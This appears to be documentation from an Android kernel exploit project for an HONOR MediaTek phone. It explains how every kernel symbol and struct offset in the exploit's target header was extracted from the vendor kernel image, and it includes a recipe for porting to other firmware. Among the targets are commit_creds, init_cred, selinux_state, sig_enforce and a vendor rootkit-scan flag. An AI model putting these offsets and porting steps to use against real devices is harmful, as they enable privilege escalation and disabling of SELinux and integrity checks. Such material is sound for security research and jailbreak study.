# Deriving every offset in `target.h`

Every constant in
[`exploit/src/targets/mtk-SDY-AN00_8.0.0.220/target.h`](../exploit/src/targets/mtk-SDY-AN00_8.0.0.220/target.h)
was read out of the vendor kernel **Image the device actually runs** — never
guessed and never copied from another device. [FIRMWARE.md](FIRMWARE.md)
explains how that image was recovered from HONOR's own OTA; this file shows how
each number was extracted from it, so the same recipe can be re-run for a
different firmware.

Inputs:

| file | what it is |
|---|---|
| `kernel_880324.bin` | the raw arm64 `Image`, gunzipped out of the OTA `boot` partition |
| `kernel_880324.elf` | `vmlinux-to-elf` output — same bytes, linked with symbols |
| `syms.txt` | the `.elf` symbol dump (`readelf -sW` / `objdump -t`) |

## 1. Kernel symbols — `vmlinux-to-elf`

A raw `Image` has no ELF header and no symbol table, but the running kernel
still carries kallsyms *as data*. `vmlinux-to-elf` locates the embedded
kallsyms tables and rebuilds a linkable ELF whose symbols sit at their
link-time virtual addresses:

```sh
vmlinux-to-elf kernel_880324.bin kernel_880324.elf
readelf -sW kernel_880324.elf > syms.txt
```

The link base falls straight out of the first symbol, and every `*_OFF` in
`target.h` is just `addr - KIMAGE_TEXT_BASE`:

```
ffffffc010000000 T _text
```

| symbol | link address | offset used | target.h macro |
|---|---|---|---|
| `_text` | `ffffffc010000000` | `0` | `KIMAGE_TEXT_BASE` |
| `commit_creds` | `ffffffc01039f948` | `0x39f948` | `LINK_COMMIT_CRED_ADDR` |
| `rt_sched_class` | `ffffffc0127c7dc0` | `0x27c7dc0` | `SLIDE_RT_SCHED_CLASS_OFF` |
| `nfulnl_logger` | `ffffffc012c0f0e0` | `0x2c0f0e0` | `SLIDE_NFULNL_LOGGER_OFF` |
| `init_task` | `ffffffc012c19b40` | `0x2c19b40` | `INIT_TASK_OFF` |
| `init_cred` | `ffffffc012c2d138` | `0x2c2d138` | `INIT_CRED_OFF` |
| `sig_enforce` | `ffffffc0133388d0` | `0x33388d0` | `SIG_ENFORCE_OFF` |
| `root_task_group` | `ffffffc0134bdf00` | `0x34bdf00` | `ROOT_TASK_GROUP_OFF` |
| `selinux_state` | `ffffffc0136da5a0` | `0x36da5a0` | `SELINUX_ENFORCING_OFF` |
| `g_rscan_skip_flag` | `ffffffc0136de348` | `0x36de348` | `RSCAN_SKIP_FLAG_OFF` |
| `sysctl_bootid` | `ffffffc0136ecf1c` | `0x36ecf1c` | `SLIDE_RANDOM_BOOT_ID_DATA_OFF` |

Two values are read arithmetically rather than by name, because Honor does not
export a symbol for them:

- `SLIDE_LOGGERS_0_1_OFF = 0x2c0f008` — the base of the `nf_loggers[]` array
  `nfulnl_logger` is registered into. The exploit stamps this *physmap alias*
  as a slide-independent marker; its address is confirmed from the
  `nf_log_register` call site.
- `SLIDE_SYSCTL_BOOTID_OFF = 0x33bb070` — the `boot_id` entry inside
  `random_table` (`ffffffc0133baf70`), i.e. the `ctl_table` whose `.data`
  pointer the exploit hijacks. Taken from the disassembly of the
  `random_table` initialiser / `proc_do_uuid` path, not from a symbol.

> **Honor strips symbols.** The running device's `/proc/kallsyms` does *not*
> contain `commit_creds`: it is present in the recovered image but removed from
> the printed name table. That is precisely why the KernelSU loader builds a
> *fake* `/proc/kallsyms` with `commit_creds` prepended before `load_ko` runs —
> see [../ksu/README.md](../ksu/README.md).

## 2. Struct offsets — `objdump`

Struct member offsets come from disassembling the functions that touch the
member. Because the recovered `.elf` has symbols, the call sites are easy to
find. Two examples below are also the numbers that define the stack-carrier
geometry ([CARRIER.md](CARRIER.md)); the rest follow the same pattern.

```sh
objdump -d --no-show-raw-insn \
  --start-address=0xffffffc010473e90 --stop-address=0xffffffc010473fa0 \
  kernel_880324.elf
```

`futex_wait_requeue_pi` (`ffffffc010473e90`) — the stale waiter's home frame:

```
sub  sp, sp, #0x1b0          ; frame = 0x1B0
...
add  x0, sp, #0x98           ; &rt_waiter
mov  w2, #0x50               ; sizeof(struct rt_mutex_waiter) = 0x50
bl   __memset
```

→ `rt_waiter` sits at `sp + 0x98` in a `0x1B0` frame.

`ip_setsockopt` (`ffffffc01157bf78`) — the carrier:

```
stp  x29, x30, [sp, #-96]!
sub  sp, sp, #0x240          ; frame = 0x60 + 0x240 = 0x2A0
...
add  x0, sp, #0x20           ; &group_source_req
mov  w2, #0x108              ; sizeof(struct group_source_req) = 264
bl   _copy_from_user.76098
```

→ the `group_source_req` copy lands at `sp + 0x20` in a `0x2A0` frame.

Member offsets confirmed the same way:

| member | offset | read from (disassembly evidence) |
|---|---|---|
| `task_struct.usage` | `0x30` | `__put_task_struct`: `add x8, x19, #0x30` before the refcount op |
| `task_struct.real_cred` / `.cred` | `0x7b0` / `0x7b8` | `commit_creds`: `add x10, x11, #0x7b0` / `#0x7b8` |
| `task_struct.comm` | `0x7c8` | `__set_task_comm`: `add x22, x19, #0x7c8` (memcpy target) |
| `task_struct.pi_lock` | `0x8a4` | `rt_mutex_adjust_prio_chain`: `add x26, x19, #0x8a4` |
| `task_struct.pi_waiters` | `0x8b8` | `rt_mutex_adjust_prio_chain`: `add x8, x19, #0x8b8` |
| `task_struct.pi_top_task` | `0x8c8` | `rt_mutex_adjust_prio_chain` |
| `task_struct.pi_blocked_on` | `0x8d0` | `rt_mutex_adjust_prio_chain` |
| `task_struct.prio` / `normal_prio` | `0xfc` / `0x104` | `__sched_setscheduler` writes |
| `task_struct.sched_class` | `0x110` | `__sched_setscheduler` |
| `rt_mutex_waiter.tree_entry` / `.pi_tree_entry` | `0x00` / `0x18` | `rt_mutex_enqueue` / `rb_erase` call sites |
| `rt_mutex_waiter.task` / `.lock` | `0x30` / `0x38` | `rt_mutex_adjust_prio_chain` field reads |
| `rt_mutex_waiter.prio` / `.deadline` | `0x40` / `0x48` | `rt_mutex_adjust_prio_chain` |
| `mm_struct.owner` | `0x348` | `mm_update_next_owner`: `ldr x8, [x0, #840]` / `str xzr, [x19, #840]` |

## 3. Physical-layout constants

| constant | value | why |
|---|---|---|
| `KIMAGE_TEXT_BASE` | `0xffffffc010000000` | `_text` link address (§1) |
| `P0_PAGE_OFFSET` | `0xffffff8000000000` | arm64 `PAGE_OFFSET` for `VA_BITS=39`, 4 KiB pages |
| `P0_PHYS_OFFSET` | `0x40000000` | MTK64 DRAM base (the `memory` node / `CONFIG_PHYS_OFFSET`) |
| `P0_KERNEL_PHYS_LOAD` | `0x40080000` | DRAM base + arm64 `text_offset` (`0x80000`); the same constant is visible in `lk.img` |
| `KERNELSNITCH_IDENTITY_END` | `P0_PAGE_OFFSET + 0x400000000` | KernelSnitch scans the 16 GB identity window above `PAGE_OFFSET` |
| `DIRECT_MAP_END` | `0xffffff8400000000` | `PAGE_OFFSET + 16 GiB`; the direct map ends where the identity map ends |

## 4. Re-running this for a different firmware

1. Recover the exact `boot` image for that build ([FIRMWARE.md](FIRMWARE.md)).
2. `vmlinux-to-elf` → symbols, recompute every `*_OFF` against `_text`.
3. Disassemble the functions listed above → struct offsets.
4. Re-tune the stack-carrier shift ([CARRIER.md](CARRIER.md)) — this is the one
   number that cannot be computed offline, only measured on the device.
